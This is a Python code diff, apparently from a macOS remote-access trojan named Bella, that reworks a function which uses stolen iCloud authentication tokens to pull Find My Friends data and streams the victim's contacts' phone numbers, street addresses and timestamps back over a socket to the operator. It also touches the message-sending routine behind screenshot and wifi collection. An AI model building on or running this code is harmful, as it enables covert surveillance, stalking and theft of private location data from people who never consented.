@@ -669,6 +669,7 @@ def heard_it_from_a_friend_who(uDsid, mmeAuthToken, cardData):
 		}
 	}
 	jsonData = json.dumps(data)
+	send_msg('%sRequesting FMF data.\n' % blue_star, False)
 	request = urllib2.Request(url, jsonData, headers)
 	i = 0
 	while 1:
@@ -679,6 +680,7 @@ def heard_it_from_a_friend_who(uDsid, mmeAuthToken, cardData):
 			i +=1
 			continue
 	x = json.loads(response.read())
+	send_msg('%sGot FMF Data.\n' % yellow_star, False)
 	dsidList = []
 	phoneList = [] #need to find how to get corresponding name from CalDav
 	for y in x["following"]: #we need to get contact information.
@@ -694,7 +696,12 @@ def heard_it_from_a_friend_who(uDsid, mmeAuthToken, cardData):
 	zippedList = zip(dsidList, phoneList)
 	retString = ""
 	i = 0
-	for y in x["locations"]:#[0]["location"]["address"]:
+	try:
+		locations = x["locations"]
+	except KeyError:
+		send_msg('%sCould not find locations. Try again.\n' % red_minus, False)
+		return
+	for y in locations:
 		streetAddress, country, state, town, timeStamp = " " *5
 		dsid = y["id"].replace("~", "=")
 		dsid = base64.b64decode(dsid) #decode the base64 id, and find its corresponding one in the zippedList.
@@ -736,15 +743,16 @@ def heard_it_from_a_friend_who(uDsid, mmeAuthToken, cardData):
 				town = v
 
 		if streetAddress != " ": #in the event that we cant get a street address, dont print it to the final thing
-			retString += "%s\n%s\n%s, %s, %s\n%s\n%s\n" % ("\033[34m" + phoneNumber, "\033[92m" + streetAddress, town, state, country, "\033[0m" + timeStamp,"-----")
+			send_msg("%s\n%s\n%s, %s, %s\n%s\n%s\n" % ("\033[34m" + phoneNumber, "\033[92m" + streetAddress, town, state, country, "\033[0m" + timeStamp,"-----"), False)
 		else:
-			retString += "%s\n%s, %s, %s\n%s\n%s\n" % ("\033[34m" + phoneNumber, "\033[92m" + town, state, country, "\033[0m" + timeStamp,"-----")
+			send_msg("%s\n%s, %s, %s\n%s\n%s\n" % ("\033[34m" + phoneNumber, "\033[92m" + town, state, country, "\033[0m" + timeStamp,"-----"), False)
 
 		i += 1
 	localToken = tokenRead()
 	if tokenRead() != False:
 		uDsid = tokenRead().split("\n")[0]
-	return retString + "\033[91mFound \033[93m[%s]\033[91m friends for %s!\033[0m\n" % (i, uDsid)
+	send_msg("\033[91mFound \033[93m[%s]\033[91m friends for %s!\033[0m\n" % (i, uDsid), False)
+	return
 
 def iCloud_auth_process(tokenOverride):
 	#this function will return a username and password combination, or a DSID and token combination, along with a code for which one is being used.
@@ -1660,9 +1668,10 @@ def screenShot():
 
 def send_msg(msg, EOF):
 	global bella_connection
-	#msg = pickle.dumps((msg, EOF))
-	final_msg = struct.pack('>I', len(msg)) + struct.pack('?', EOF) + msg #serialize into string. pack bytes so that recv function knows how many bytes to loop
-	bella_connection.sendall(final_msg) #send serialized
+	if isinstance(msg, unicode):
+		msg = msg.encode('utf-8')
+	final_msg = struct.pack('>I', len(msg)) + struct.pack('?', EOF) + msg
+	bella_connection.sendall(final_msg)
 
 def getWifi():
 	ssid = subprocess.Popen("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -2069,7 +2078,8 @@ def bella(*Emma):
 						send_msg(errorMessage, True)
 					else:
 						cardData = get_card_data(dsid, token)
-						send_msg(heard_it_from_a_friend_who(dsid, token, cardData), True)
+						heard_it_from_a_friend_who(dsid, token, cardData)
+						send_msg('', True)
 
 				elif data == 'iCloud_contacts':
 					(error, errorMessage, dsid, token) = main_iCloud_helper()
